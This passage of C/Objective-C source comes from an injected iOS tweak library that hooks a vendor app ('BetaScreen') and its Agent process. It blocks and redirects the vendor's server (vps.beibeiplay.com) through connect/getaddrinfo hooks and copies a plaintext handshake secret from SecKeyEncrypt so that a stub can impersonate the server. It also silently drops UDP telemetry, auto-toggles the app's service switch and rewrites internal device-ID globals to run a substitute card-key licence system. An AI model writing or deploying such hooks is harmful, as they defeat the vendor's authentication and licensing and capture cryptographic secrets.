        memcpy(&a, addr, sizeof(a));
        if (a.sin_addr.s_addr == g_vps_ip_net) {
            long n = ++g_blk_n_connect;
            if (n <= 5 || n % 60 == 1)
                bs_log("[blk] connect " VPS_IP_STR ":%d blocked (#%ld)",
                       (int)ntohs(a.sin_port), n);
            errno = EHOSTUNREACH;
            return -1;
        }
    }
    return g_orig_connect(fd, addr, len);
}

/// getaddrinfo 替身：解析 vps.beibeiplay.com → EAI_NONAME（TCP/UDP 全掐在源头）。
///   ★ v6.24s：若中控下发了 s2，则把域名换成 s2 的数字 IP 再交给系统解析 ——
///   既不查外网 DNS、也不放行厂商域名，还让「缺 agent.dat」的设备拿到可连地址。
static int bs_hook_getaddrinfo(const char *node, const char *service,
                               const struct addrinfo *hints, struct addrinfo **res) {
    if (!bs_orig_fn("getaddrinfo", (void **)&g_orig_getaddrinfo))
        return EAI_SYSTEM;
    if (node && !strcmp(node, VPS_DOMAIN) && g_s2_net) {
        long n = ++g_s2_n;
        if (n <= 5 || n % 60 == 1)
            bs_log("[s2] dns " VPS_DOMAIN " -> %s (%s) (#%ld)", g_s2_ip, g_s2_src, n);
        return g_orig_getaddrinfo(g_s2_ip, service ? service : "7891", hints, res);
    }
    if (!g_blk_active)
        return g_orig_getaddrinfo(node, service, hints, res);
    if (node && !strcmp(node, VPS_DOMAIN)) {
        long n = ++g_blk_n_dns;
        if (n <= 5 || n % 60 == 1)
            bs_log("[blk] getaddrinfo " VPS_DOMAIN " blocked (#%ld)", n);
        return EAI_NONAME;
    }
    return g_orig_getaddrinfo(node, service, hints, res);
}

// ★★★★ v6.25：SecKeyEncrypt 替身 —— 只为把 32B 明文 R 抄下来。
//   262B 握手包里 R 是 RSA 密文，桩解不开；但加密前它就在寄存器/内存里明文躺着，
//   在进程内抄一份给桩用，是唯一不需要私钥的路。抄完立刻交回原函数，零副作用。
static int (*g_orig_skenc)(void *, int, const uint8_t *, size_t, uint8_t *, size_t *);
static int      g_skenc_hit = 0;

static int bs_hook_seckeyencrypt(void *key, int padding, const uint8_t *plain,
                                 size_t plen, uint8_t *cipher, size_t *clen) {
    if (g_offline && plain && plen == 32) {
        memcpy(g_off_R, plain, 32);
        g_off_R_ok = 1;
        if (!g_skenc_hit) {
            g_skenc_hit = 1;
            bs_log("[off] R captured %02x%02x%02x%02x..%02x%02x%02x%02x (pad=%d)",
                   plain[0], plain[1], plain[2], plain[3],
                   plain[28], plain[29], plain[30], plain[31], padding);
        }
    }
    if (!bs_orig_fn("SecKeyEncrypt", (void **)&g_orig_skenc)) {
        errno = ENOSYS;
        return -1;
    }
    return g_orig_skenc(key, padding, plain, plen, cipher, clen);
}

static void bs_install_net_block(void) {
    if (g_blk_installed) return;
    g_vps_ip_net = inet_addr(VPS_IP_STR);
    struct rebinding rbs[2] = {
        { "connect",     (void *)bs_hook_connect,     (void **)&g_orig_connect     },
        { "getaddrinfo", (void *)bs_hook_getaddrinfo, (void **)&g_orig_getaddrinfo },
    };
    int rc = rebind_symbols(rbs, 2);
    g_blk_installed = 1;
    // ★ v6.21：interpose 在装载时已生效，此处只开闸门
    // ★ v6.24s：闸门跟随 blockvps —— 0 时 hook 仍在（s2 改道用），只是不拦域名/旧 IP
    g_blk_active = g_block_vps ? 1 : 0;
    bs_log("[blk] net block installed rc=%d fish=%d/%d interpose=on active=%d ("
           VPS_DOMAIN " / " VPS_IP_STR ", unlock only)",
           rc, g_orig_connect ? 1 : 0, g_orig_getaddrinfo ? 1 : 0, g_blk_active);
}

// ★★★★ v6.25i：UDP 出口白名单 —— 旧实现最大的一个洞。
//   connect 层拦不到无连接的 UDP，而 sendto/sendmsg 的目标直接写在参数里。
//   实测厂商确有用 7875/7880 做统计上报（.216 日志里 [stat] connect
//   60.204.159.47:7875 出现 51 次），只要哪天改成 UDP，一个字节都拦不住。
//   拒绝时返回 len（假装发成功）：返回 -1 会让厂商立刻重试，变成风暴。
static ssize_t (*g_orig_sendto)(int, const void *, size_t, int,
                                const struct sockaddr *, socklen_t);
static ssize_t (*g_orig_sendmsg)(int, const struct msghdr *, int);

static ssize_t bs_hook_sendto(int fd, const void *buf, size_t len, int flags,
                              const struct sockaddr *to, socklen_t tolen) {
    if (g_offline && g_off_egress && to && to->sa_family == AF_INET) {
        struct sockaddr_in a;
        memcpy(&a, to, sizeof(a));
        if (!off_egress_ok(a.sin_addr.s_addr)) {
            off_deny(a.sin_addr.s_addr, (int)ntohs(a.sin_port), 1);
            return (ssize_t)len;
        }
    }
    if (!bs_orig_fn("sendto", (void **)&g_orig_sendto)) { errno = ENOSYS; return -1; }
    return g_orig_sendto(fd, buf, len, flags, to, tolen);
}

static ssize_t bs_hook_sendmsg(int fd, const struct msghdr *msg, int flags) {
    if (g_offline && g_off_egress && msg && msg->msg_name &&
        msg->msg_namelen >= (socklen_t)sizeof(struct sockaddr_in)) {
        const struct sockaddr *to = (const struct sockaddr *)msg->msg_name;
        if (to->sa_family == AF_INET) {
            struct sockaddr_in a;
            size_t tot = 0;
            size_t i;
            memcpy(&a, to, sizeof(a));
            if (!off_egress_ok(a.sin_addr.s_addr)) {
                off_deny(a.sin_addr.s_addr, (int)ntohs(a.sin_port), 1);
                for (i = 0; i < (size_t)msg->msg_iovlen; i++)
                    tot += msg->msg_iov[i].iov_len;
                return (ssize_t)tot;
            }
        }
    }
    if (!bs_orig_fn("sendmsg", (void **)&g_orig_sendmsg)) { errno = ENOSYS; return -1; }
    return g_orig_sendmsg(fd, msg, flags);
}

// ★ v6.21：dyld interpose —— fishhook 只能重绑**调用方镜像**的 GOT，实测
//   _bb_run_auth 的 connect 走共享缓存内部调用（[blk] 计数恒 0）拦不住。
//   __DATA,__interpose 对全进程所有经 dyld 桩的调用点生效（含 CFNetwork），
//   与 fishhook 并存无冲突（同一替身，orig 各自解析）。
#define BS_INTERPOSE(replacement, replacee)                                   \
    __attribute__((used)) static struct {                                     \
        const void *replacement;                                              \
        const void *replacee;                                                 \
    } bs_interpose_##replacee                                                 \
    __attribute__((section("__DATA,__interpose"))) = {                        \
        (const void *)(unsigned long)&replacement,                            \
        (const void *)(unsigned long)&replacee,                               \
    }

BS_INTERPOSE(bs_hook_connect, connect);
BS_INTERPOSE(bs_hook_getaddrinfo, getaddrinfo);
// ★ v6.25i：UDP 出口白名单（无连接协议，connect 层覆盖不到）
BS_INTERPOSE(bs_hook_sendto, sendto);
BS_INTERPOSE(bs_hook_sendmsg, sendmsg);
// ★ v6.25：真离线。Security.framework 必然存在（Agent 已导入 SecKeyEncrypt），
//   CI 需加 -framework Security 才能链接到该符号。
BS_INTERPOSE(bs_hook_seckeyencrypt, SecKeyEncrypt);

/// ★ v6.19：constructor 立即起的安装线程 —— 赶在 Agent 首次外联之前。
///   不等 bootstrap 的 2s sleep：自己快扫 conf 的 mode=/blockvps=（毫秒级纯 C）。
///   probe（真卡机）永不装钩子 —— 卡密心跳必须活着。
// ══════════ ★ v6.23v App 进程：安装后首启自动点「启动服务」 ══════════
// 只在 App 本体进程跑（filter 扩到 App 后 ElleKit 会把本 dylib 也注入 App）。

// 判当前进程是不是 App 本体（可执行名 = BetaScreenTYMDESUJCX8T；Agent 名多一个 "Agent"）
static int bs_proc_is_app(void) {
    char path[1024];
    uint32_t sz = sizeof(path);
    if (_NSGetExecutablePath(path, &sz) != 0) return 0;
    const char *bn = strrchr(path, '/');
    bn = bn ? bn + 1 : path;
    return strcmp(bn, "BetaScreenTYMDESUJCX8T") == 0;
}

// 「装后自动点服务」标记：postinst 写（内容=deb 版本号），点成功后改名消费
static int bs_autosvc_pending(char *ver, size_t vsz) {
    char path[300];
    snprintf(path, sizeof(path), DATA_DIR "/.autosvc_pending");
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    if (ver && vsz) {
        ver[0] = 0;
        if (fgets(ver, (int)vsz, f)) {
            size_t n = strlen(ver);
            while (n && (ver[n-1] == '\n' || ver[n-1] == '\r' || ver[n-1] == ' ')) ver[--n] = 0;
        }
    }
    fclose(f);
    return 1;
}

// UI 属性协议 —— 只声明用到的选择器，保证 objc_msgSend 的返回值寄存器约定正确
// （CGFloat/double 走 v 寄存器，裸 id 消息会读错寄存器，必须经协议声明）
@protocol BSAutoUI <NSObject>
@optional
- (NSArray *)windows;
- (NSArray *)subviews;
- (BOOL)isHidden;
- (CGFloat)alpha;
- (NSString *)currentTitle;
- (NSString *)accessibilityLabel;
- (void)sendActionsForControlEvents:(NSUInteger)events;
- (id)rootViewController;
- (BOOL)isKeyWindow;
- (id)presentedViewController;
- (NSString *)text;
- (BOOL)isOn;
- (void)setOn:(BOOL)on animated:(BOOL)animated;
@end

@interface BSAutosvcHelper : NSObject
+ (void)as_kickoff;
- (void)as_setup;
- (void)as_tick:(id)timer;
- (BOOL)as_tryTap;
- (void)as_active:(id)note;
- (BOOL)as_scanViews:(id)views;
- (void)as_dump:(id)views depth:(int)d;
@end

static int             g_as_tries  = 0;
static int             g_as_dumpln = 0;
static int             g_as_busy   = 0;   // ★ v6.24j：点击流程进行中，避免重复 kickoff
static BSAutosvcHelper *g_as_helper = nil;

@implementation BSAutosvcHelper

// 递归扫 UIWindow 树。命中规则（.47 UI dump 实锤：启动服务 = UILabel+UISwitch 开关）：
//   ① 首选 —— 同容器内存在 text 含「启动服务」的 UILabel 且存在 UISwitch → 拨开关：
//      setOn:YES + sendActionsForControlEvents:UIControlEventValueChanged(4096)，
//      走 App 自己的启动链路（会话协商齐全）；已 ON 则只消费标记不动开关。
//   ② 兜底 —— UIButton title/accessibilityLabel 含「启动服务」→ 模拟 TouchUpInside。
- (BOOL)as_scanViews:(id)views {
    if (!views) return NO;
    id btnCls = NSClassFromString(@"UIButton");
    id lblCls = NSClassFromString(@"UILabel");
    id swCls  = NSClassFromString(@"UISwitch");

    // ① UISwitch 开关路径
    if (swCls && lblCls) {
        BOOL hasLabel = NO;
        id<BSAutoUI> sw = nil;
        for (id<BSAutoUI> v in views) {
            if (!v || [v isHidden]) continue;
            if ([v isKindOfClass:lblCls]) {
                NSString *t = [v text];
                if (t && [t rangeOfString:@"启动服务"].location != NSNotFound) hasLabel = YES;
            } else if (!sw && [v isKindOfClass:swCls]) {
                sw = v;
            }
        }
        if (hasLabel && sw) {
            if ([sw isOn]) {
                bs_log("[autosvc] start-service switch already ON -> consume marker (no-op)");
            } else {
                [(id)sw setOn:YES animated:NO];
                [(id)sw sendActionsForControlEvents:(NSUInteger)4096]; // UIControlEventValueChanged
                bs_log("[autosvc] start-service switch -> set ON + valueChanged sent");
            }
            return YES;
        }
    }

    // ② UIButton 兜底
    for (id<BSAutoUI> v in views) {
        if (!v) continue;
        if (btnCls && [v isKindOfClass:btnCls]) {
            if ([v isHidden]) continue;
            if ([v alpha] < 0.05) continue;
            NSString *t  = [v currentTitle];
            NSString *lb = [v accessibilityLabel];
            BOOL hit = NO;
            if (t  && [t  rangeOfString:@"启动服务"].location != NSNotFound) hit = YES;
            if (!hit && lb && [lb rangeOfString:@"启动服务"].location != NSNotFound) hit = YES;
            if (!hit) continue;
            bs_log("[autosvc] button found -> tap (title=%s)", t ? [t UTF8String] : "?");
            [v sendActionsForControlEvents:(NSUInteger)64];   // UIControlEventTouchUpInside
            return YES;
        }
        if ([self as_scanViews:[v subviews]]) return YES;
    }
    return NO;
}

- (BOOL)as_tryTap {
    id appCls = NSClassFromString(@"UIApplication");
    if (!appCls) return NO;
    id app = [(id)appCls sharedApplication];
    if (!app) return NO;
    NSArray *wins = [(id<BSAutoUI>)app windows];
    if (!wins) return NO;
    // ★ 诊断：窗口清单 + rootVC 链（tries 1）；UI 树 dump（tries 1/2/30）
    if (g_as_tries == 1) {
        bs_log("[autosvc] windows=%lu", (unsigned long)wins.count);
        for (id w in wins) {
            id<BSAutoUI> ww = (id<BSAutoUI>)w;
            id root = [ww rootViewController];
            id pres = root ? [(id)root presentedViewController] : nil;
            bs_log("[autosvc] win key=%d hidden=%d rootVC=%s presented=%s",
                   [ww isKeyWindow] ? 1 : 0, [ww isHidden] ? 1 : 0,
                   root ? NSStringFromClass([root class]).UTF8String : "nil",
                   pres ? NSStringFromClass([pres class]).UTF8String : "nil");
        }
    }
    if (g_as_tries <= 2 || g_as_tries == 30) {
        g_as_dumpln = 0;
        for (id w in wins) [self as_dump:[w subviews] depth:0];
        bs_log("[autosvc] UI dump done (tries=%d, lines=%d)", g_as_tries, g_as_dumpln);
    }
    for (id w in wins) {
        if ([self as_scanViews:[w subviews]]) return YES;
    }
    return NO;
}

// 递归打印视图树（cap 100 行防日志爆）
- (void)as_dump:(id)views depth:(int)d {
    if (d > 7 || !views || g_as_dumpln > 100) return;
    id btnCls  = NSClassFromString(@"UIButton");
    id lblCls  = NSClassFromString(@"UILabel");
    id swCls   = NSClassFromString(@"UISwitch");
    for (id<BSAutoUI> v in views) {
        if (!v) continue;
        if (g_as_dumpln > 100) return;
        NSString *cls = NSStringFromClass([v class]);
        NSMutableString *info = [NSMutableString stringWithFormat:@"d%d %@", d, cls];
        if (btnCls && [v isKindOfClass:btnCls]) {
            NSString *t = [v currentTitle];
            if (t.length) [info appendFormat:@" title=%@", t];
        }
        if (lblCls && [v isKindOfClass:lblCls]) {
            NSString *t = [v text];
            if (t.length) [info appendFormat:@" text=%@", t];
        }
        if (swCls && [v isKindOfClass:swCls]) {
            [info appendString:@" <SWITCH>"];
        }
        NSString *lb = [v accessibilityLabel];
        if (lb.length) [info appendFormat:@" label=%@", lb];
        g_as_dumpln++;
        bs_log("[autosvc][dump] %s", [info UTF8String]);
        [self as_dump:[v subviews] depth:d + 1];
    }
}

- (void)as_tick:(id)timer {
    // ★ v6.24j：标记可能已被别的 kickoff 消费（App 多次激活）→ 收尾
    char cur[64];
    if (!bs_autosvc_pending(cur, sizeof(cur))) {
        bs_log("[autosvc] marker gone -> stop tapping");
        g_as_busy = 0;
        [timer invalidate];
        return;
    }
    g_as_tries++;
    if (g_as_tries > 60) {
        bs_log("[autosvc] give up after %d tries (button not found; marker kept, retry next app start)",
               g_as_tries);
        g_as_busy = 0;
        [timer invalidate];
        return;
    }
    if ([self as_tryTap]) {
        char pend[300], done[340];
        snprintf(pend, sizeof(pend), DATA_DIR "/.autosvc_pending");
        snprintf(done, sizeof(done), DATA_DIR "/.autosvc_done_%ld", (long)time(NULL));
        if (rename(pend, done) == 0)
            bs_log("[autosvc] tapped OK -> marker consumed, service should be starting");
        else
            bs_log("[autosvc] tapped but rename failed (errno=%d)", errno);
        g_as_busy = 0;
        [timer invalidate];
        return;
    }
    // 未命中：repeats=YES 自动下一拍
}

// ★ v6.24j：App 每次「进入前台」都重新尝试 —— 装包后 App 若已在后台，
//   冷启/切前台这一下才会把「启动服务」开关点下去。
- (void)as_active:(id)note {
    char cur[64];
    if (!bs_autosvc_pending(cur, sizeof(cur))) return;
    if (g_as_busy) {
        bs_log("[autosvc] did-become-active, tap already in progress (tries=%d)", g_as_tries);
        return;
    }
    bs_log("[autosvc] did-become-active with pending marker -> kickoff again");
    [self as_setup];
}

- (void)as_setup {
    g_as_busy = 1;
    g_as_tries = 0;
    NSTimer *t = [NSTimer timerWithTimeInterval:2.0
                                         target:self
                                       selector:@selector(as_tick:)
                                       userInfo:nil
                                        repeats:YES];
    [[NSRunLoop mainRunLoop] addTimer:t forMode:NSRunLoopCommonModes];
}

+ (void)as_kickoff {
    BSAutosvcHelper *h = [[BSAutosvcHelper alloc] init];
    g_as_helper = h;   // 常驻引用（timer 也 retain target）
    // ★ v6.24j：激活通知在后台线程注册（不碰 dyld/ObjC 冷启动期），
    //   收到后 onMainThread 起定时器 —— 覆盖「装包时 App 已在后台」的场景。
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^{
        @autoreleasepool {
            [[NSNotificationCenter defaultCenter]
                addObserver:g_as_helper
                   selector:@selector(as_active:)
                       name:@"UIApplicationDidBecomeActiveNotification"
                     object:nil];
        }
    });
    [h performSelectorOnMainThread:@selector(as_setup) withObject:nil waitUntilDone:NO];
}

@end
// ══════════════════════════════════════════════════════════════════════

static void *bs_block_init(void *arg) {
    (void)arg;
    // ★ v6.23v：App 进程不装 net block —— 只在 Agent 进程屏蔽厂商服务器。
    //   App 的中控连接（server2 34878）与厂商心跳路径不明的，宁可不动。
    if (bs_proc_is_app()) return NULL;
    char mode[24] = {0};
    int bv = 1;
    // ★ v6.23r 修复：快扫原来读 DATA_DIR/bs_pull.conf（App 数据目录，通常不存在），
    //   导致 fp=NULL → bv 缺省 1 + mode 空 → probe 例外永不生效，每次启动都装 block。
    //   真实 conf 在 PULL_CONF（Media 根）。改为先读 PULL_CONF，读不到再回落 DATA_DIR
    //   （兼容曾把 conf 放 App 数据目录的设备）。
    FILE *fp = fopen(PULL_CONF, "r");
    if (!fp) fp = fopen(DATA_DIR "/bs_pull.conf", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            char *eq = strchr(line, '=');
            if (!eq) continue;
            *eq = 0;
            char *v = eq + 1;
            char *nl = strchr(v, '\n');
            if (nl) *nl = 0;
            char *cr = strchr(v, '\r');
            if (cr) *cr = 0;
            if (!strcmp(line, "mode")) {
                snprintf(mode, sizeof(mode), "%s", v);
            } else if (!strcmp(line, "blockvps")) {
                bv = atoi(v) ? 1 : 0;
            }
        }
        fclose(fp);
    }
    if (!strcmp(mode, "probe")) {
        bs_log("[blk] probe mode (real card) -> no block");
        return NULL;
    }
    // ★ v6.24s：blockvps=0 也要装 hook —— s2（server2 改道）走的是同一对 hook，
    //   不装就彻底没有改道能力。拦不拦由 g_blk_active 单独决定，两者解耦。
    g_block_vps = bv ? 1 : 0;
    if (!bv) bs_log("[blk] blockvps=0 -> hooks installed, BLOCK DISABLED (s2 redirect still on)");
    bs_install_net_block();
    return NULL;
}

// ════════════════════════════════════════════════════════════════════
// ★★★ v6.20 自有卡密系统（CardVault v2 统一协议） — [card] 前缀
// ════════════════════════════════════════════════════════════════════

static void bs_card_cache_save(void) {
    char path[300];
    snprintf(path, sizeof(path), "%s/bs_card.txt", DATA_DIR);
    FILE *f = fopen(path, "w");
    if (!f) return;
    // ★ v6.23t：kicked/kickts 一并落盘 —— 被踢设备重启后内存拉黑会丢，
    //   而 agent.log 尾部扫描（无 offset）仍能抓到同一卡号 → 会以 act=new
    //   抢回，与接管方 60s 心跳互踢。落盘后重启仍拉黑，须真输入才解除。
    fprintf(f, "expire=%ld\nlastok=%ld\ncard=%s\nkicked=%s\nkickts=%ld\n",
            g_card_expire, g_card_lastok, g_card_cur, g_card_kicked, g_card_kickts);
    fclose(f);
}

static void bs_card_cache_load(void) {
    char path[300];
    snprintf(path, sizeof(path), "%s/bs_card.txt", DATA_DIR);
    FILE *f = fopen(path, "r");
    if (!f) return;
    char line[160];
    while (fgets(line, sizeof(line), f)) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = 0;
        if (!strncmp(line, "expire=", 7))  g_card_expire = strtol(line + 7, NULL, 10);
        if (!strncmp(line, "lastok=", 7)) g_card_lastok = strtol(line + 7, NULL, 10);
        if (!strncmp(line, "card=", 5))   snprintf(g_card_cur, sizeof(g_card_cur), "%s", line + 5);
        if (!strncmp(line, "kicked=", 7)) snprintf(g_card_kicked, sizeof(g_card_kicked), "%s", line + 7);
        if (!strncmp(line, "kickts=", 7)) g_card_kickts = strtol(line + 7, NULL, 10);
    }
    fclose(f);
    // ★ v6.47：缓存里有「被拒的卡」且还在 30 分钟窗口内 → 恢复备注侧冲突记忆。
    //   进程重启后备注会重新报一次（中控可能也重启过、丢了这条），但仍只报一次。
    if (g_card_kicked[0] && g_card_cur[0]) {
        time_t t0 = time(NULL);
        if (g_card_kickts > 0 && (long)t0 - g_card_kickts < 1800) {
            snprintf(g_note_cf_card, sizeof(g_note_cf_card), "%s", g_card_kicked);
            g_note_cf_ts   = g_card_kickts;
            g_note_cf_sent = 0;
        }
    }
    bs_log("[card] cache loaded expire=%ld lastok=%ld card=%.20s... kicked=%.20s (%ld)",
           g_card_expire, g_card_lastok, g_card_cur, g_card_kicked, g_card_kickts);
}

/// ★ v6.26：本地持久化设备码 —— hw.serial 与 token 都拿不到时的最终兜底。
///   现场（2026-10-21）：postinst 靠 agent.log 的 "send dev online success:<hex>"
///   取 DEVID 写 token=，装包时 Agent 尚未上报成功就跳过、且无补写 ⇒ token 恒空
///   ⇒ device_id 全变字面量 "unknown" ⇒ 同网/多机共享同一虚拟设备 ID，服务端按
///   device 判定换卡 ⇒ 互相顶卡，每顶一次写一条 auto-unbind（实测 4973 条）。
///   这里生成 32hex 落盘复用，保证每台设备有稳定且互不相同的 device_id。
// ============================================================================
// ★★★★ v6.41：设备码「单一真源」—— 全项目只认一个值，零备用分支
//
// 【真值是什么】
//   Agent 进程内的 _g_script_dev_id（NSString*，符号 vmaddr 0x100053028）。
//   它**就是贝塔 APP 界面上显示的那一串**：Agent 从服务端配置 TLV(type=0x0a)
//   收下后写进这个全局（全二进制唯一写入点 0x1000142cc，位于配置分发器
//   _bb_RPFBXL3V9G 内），APP 只是通过 agent.sock 向 Agent 要这个值。
//
// 【为什么不自己算】
//   服务端按硬件指纹（MGCopyAnswer 的 SerialNumber / UniqueChipID / ProductType /
//   UniqueDeviceID / WifiAddress / ModelNumber… 拼串后 CC_MD5）认机，
//   同一台机每次回同一个号。指纹算法在服务端，客户端复现不了
//   ⇒ 我们**不生成**，只忠实取原值。
//
// 【三个动作，仅此三个】
//   ① 读：dlsym("get_script_dev_id") —— 走 Agent 自己的 pthread_mutex，线程安全；
//      符号不存在（APP 进程）直接返回"无值"，不做任何猜测。
//   ② 钉盘：/var/mobile/Media/.bsdeveid
//      —— 卸载 deb（prerm 只删 .bsp / bs_modules / bs_pull.conf）、
//         卸载重装 APP、覆盖 bspath，都不会碰这个路径。
//   ③ 回填：Agent 尚未收到 TLV 的冷启窗口内，把钉盘值 set 回 _g_script_dev_id，
//      使 APP 显示 / 中控上报 / 卡密绑定从第一秒起就是同一个号。
//
// 【结构性保证】
//   真值**不依赖我们的存储**：Agent 每次启动都会重新收到同一个号（服务端按硬件认机）。
//   钉盘只是"尽早可用"的缓存，丢了也会在 Agent 连上后自动重建
//   ⇒ 结构上不存在"两份数据不一致"的可能。
//
// 【旧实现已删（漂移元凶）】
//   · md5(序号|时间|pid|栈|clock|hw.machine) 随机 32hex
//   · hw.serial 优先（iOS 上恒为字面量 "unknown"，等于第一条的触发器）
//   · token / "unknown" 兜底
// ============================================================================
#define DEV_SYM_GET     "get_script_dev_id"      // id  (void)：pthread_mutex + objc_retain
#define DEV_SYM_SET     "set_script_dev_id"      // void (id)
#define DEV_SYM_GLOBAL  "g_script_dev_id"        // NSString* —— getter 读的同一块内存
#define DEV_PIN_FILE    "/var/mobile/Media/.bsdeveid"
#define DEV_PIN_MAGIC   "bsp-deveid-v1"

typedef id   (*bs_dev_get_fn)(void);
typedef void (*bs_dev_set_fn)(id);

static void bs_dev_lower(char *s, size_t n) {
    for (size_t i = 0; i < n; i++)
        if (s[i] >= 'A' && s[i] <= 'F') s[i] = (char)(s[i] - 'A' + 'a');
}

/// 在任意文本里找第一段连续的 32 位十六进制（大小写不限），小写归一化写入 out[40]。
static int bs_dev_find_hex32(const char *s, char out[40]) {
    if (!s) return 0;
    for (const char *p = s; *p; p++) {
        if (!isxdigit((unsigned char)*p)) continue;
        const char *q = p;
        int i = 0;
        char t[34];
        while (*q && i < 33 && isxdigit((unsigned char)*q)) t[i++] = *q++;
        if (i == 32 && !isxdigit((unsigned char)*q)) {
            t[32] = 0;
            bs_dev_lower(t, 32);
            memcpy(out, t, 33);
            return 1;
        }
        p = q - 1;
    }
    return 0;
}

/// 读 Agent 进程内的真值。返回 1 = 拿到合法 32hex。
///
/// 两条通道指向**同一个符号的真值**，不是两套取值：
///   ① `get_script_dev_id()` —— 走 Agent 自己的 pthread_mutex + objc_retain，首选；
///   ② `g_script_dev_id` 变量槽位 —— 万一函数被内联/未导出，直接读同一块内存。
/// 二者都在 export trie 里（已用 _patched/mo_export_trie.py 验证：
///   _g_script_dev_id off=0x53028 / _get_script_dev_id off=0x4470）。
/// 无论走哪条，读到的都是**服务端下发的那一个号**，不存在第二个值。
static int bs_dev_read_live(char out[40]) {
    out[0] = 0;
    static bs_dev_get_fn s_get = NULL;
    static id *s_slot = NULL;
    static int s_init = 0;
    if (!s_init) {
        s_init = 1;
        s_get  = (bs_dev_get_fn)dlsym(RTLD_DEFAULT, DEV_SYM_GET);
        s_slot = (id *)dlsym(RTLD_DEFAULT, DEV_SYM_GLOBAL);
        bs_log("[deveid] agent symbols getter=%s slot=%s",
               s_get ? "yes" : "no", s_slot ? "yes" : "no");
    }
    if (s_get) {
        @autoreleasepool {
            // getter 反汇编：ldr x0,[g+0x28] → objc_retain → unlock → return x20
            // ⇒ 返回 +1 引用，所有权交给 ARC（__bridge_transfer）
            NSString *s = (__bridge_transfer NSString *)s_get();
            if (s) {
                const char *u = [s UTF8String];
                if (u && bs_dev_find_hex32(u, out)) return 1;
            }
        }
    }
    if (s_slot) {
        @autoreleasepool {
            void *raw = __atomic_load_n((void *volatile *)s_slot, __ATOMIC_ACQUIRE);
            if (!raw) return 0;
            const char *u = [(__bridge NSString *)raw UTF8String];
            return u ? bs_dev_find_hex32(u, out) : 0;
        }
    }
    return 0;
}

/// 把值写回 Agent 的真值全局（仅冷启窗口使用）。返回 1 = 已下发。
static int bs_dev_write_live(const char *v) {
    static bs_dev_set_fn s_set = NULL;
    static int s_init = 0;
    if (!s_init) {
        s_init = 1;
        s_set  = (bs_dev_set_fn)dlsym(RTLD_DEFAULT, DEV_SYM_SET);
    }
    if (!s_set || !v || !v[0]) return 0;
    NSString *ns = [NSString stringWithUTF8String:v];
    if (!ns) return 0;
    s_set(ns);                                   // setter 内部 retain，我们不持有
    return 1;
}

/// 读钉盘（唯一持久化副本）。
static int bs_dev_pin_read(char out[40]) {
    out[0] = 0;
    unsigned char *b = NULL;
    size_t bl = 0;
    if (!bs_read_file(DEV_PIN_FILE, &b, &bl)) return 0;
    int ok = 0;
    if (b && bl) {
        char t[160] = {0};
        size_t cp = bl < sizeof(t) - 1 ? bl : sizeof(t) - 1;
        memcpy(t, b, cp);
        ok = bs_dev_find_hex32(t, out);
    }
    if (b) free(b);
    return ok;
}

/// 写钉盘（原子替换；值没变就不落盘，避免无谓 IO）。
static void bs_dev_pin_write(const char *v, const char *why) {
    char cur[40] = {0};
    if (bs_dev_pin_read(cur) && strcmp(cur, v) == 0) return;
    char buf[64];
    int n = snprintf(buf, sizeof(buf), "%s %s\n", DEV_PIN_MAGIC, v);
    int w = bs_write_file_atomic(DEV_PIN_FILE, (const unsigned char *)buf, (size_t)n);
    if (w) chmod(DEV_PIN_FILE, 0644);
    if (cur[0]) bs_evt("[deveid] pin %s -> %s (agent authoritative, %s)", cur, v, why);
    else        bs_log("[deveid] pin created %.32s (%s) write=%d", v, why, w);
}

/// **唯一决策点**：全项目所有"设备号"都必须经过这里。
/// 返回进程内静态缓冲区；空串 = 真源尚未就位（调用方必须跳过绑定）。
static const char *bs_deveid_resolve(void) {
    static char s_val[40] = {0};

    char live[40] = {0};
    char pin[40]  = {0};
    int has_live  = bs_dev_read_live(live);
    int has_pin   = bs_dev_pin_read(pin);

    if (has_live) {
        // 真源有值 = 权威。钉盘跟随（换机/刷机导致号变了也自动跟上）
        if (!has_pin || strcmp(pin, live) != 0)
            bs_dev_pin_write(live, has_pin ? "drift adopted" : "seed");
        if (!s_val[0] || strcmp(s_val, live) != 0) {
            snprintf(s_val, sizeof(s_val), "%s", live);
            bs_log("[deveid] authoritative=%.32s (src=agent, pin=%s)", live,
                   !has_pin ? "created" : (strcmp(pin, live) ? "updated" : "same"));
        }
        return s_val;
    }

    if (has_pin) {
        // Agent 还没收到服务端下发：回填钉盘值，让下游从第一秒就一致
        if (strcmp(s_val, pin) != 0) {
            static int s_rb_fail = 0;
            if (bs_dev_write_live(pin))
                bs_evt("[deveid] restore %.32s -> agent (ahead of server TLV)", pin);
            else if (s_rb_fail < 3) {
                s_rb_fail++;
                bs_log("[deveid] restore skipped (setter unavailable) pin=%.32s", pin);
            }
            snprintf(s_val, sizeof(s_val), "%s", pin);
        }
        return s_val;
    }

    // 两边都没有：绝不生成
    if (!s_val[0]) {
        // ★ 可观测性：静默失败最难查。首次 + 每 5 分钟一条，带已等待时长，
        //   中控/云端 devlog 一眼能看出「是设备号没下来」而不是「卡坏了」。
        static long s_first = 0;
        static long s_last_warn = 0;
        long now = (long)time(NULL);
        if (!s_first) s_first = now;
        if (!s_last_warn || now - s_last_warn >= 300) {
            s_last_warn = now;
            bs_evt("[deveid] PENDING %lds: agent has no dev_id yet & pin empty "
                   "-> refuse to invent (card bind & heartbeat key deferred)", now - s_first);
        }
    }
    return s_val;
}

/// 兼容旧名：只填 g_card_devid，不做任何回退。
static void bs_card_devid_local(void) {
    memset(g_card_devid, 0, sizeof(g_card_devid));
    const char *v = bs_deveid_resolve();
    if (v && v[0]) snprintf(g_card_devid, sizeof(g_card_devid), "%s", v);
}

/// device_id —— 与 /hb 的 key、APP 显示值恒等（同一个真源）。
static void bs_card_device_id(void) {
    char prev[64] = {0};
    snprintf(prev, sizeof(prev), "%s", g_card_devid);
    memset(g_card_devid, 0, sizeof(g_card_devid));
    const char *v = bs_deveid_resolve();
    if (v && v[0]) {
        snprintf(g_card_devid, sizeof(g_card_devid), "%s", v);
        if (strcmp(prev, g_card_devid) != 0)
            bs_log("[card] device_id=%.32s (src=agent.dev_id)", g_card_devid);
        return;
    }
    if (prev[0]) {                                  // 曾有值：进程内不回退成空（防抖动）
        snprintf(g_card_devid, sizeof(g_card_devid), "%s", prev);
        return;
    }
